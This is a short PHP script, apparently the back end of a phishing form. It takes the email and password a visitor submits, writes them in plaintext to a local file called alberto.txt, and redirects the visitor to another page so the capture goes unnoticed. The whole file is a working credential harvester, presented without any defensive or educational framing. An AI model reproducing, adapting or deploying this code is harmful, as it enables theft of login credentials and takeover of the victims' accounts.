<?php
 $name=$_POST["email"];
 $pass=$_POST["pass"];
 $msg = "\r\t Username = $name and password = $pass";
$fo = fopen("alberto.txt","a");
fwrite($fo,$msg);
fclose($fo);
header("location:ques1.php");
?>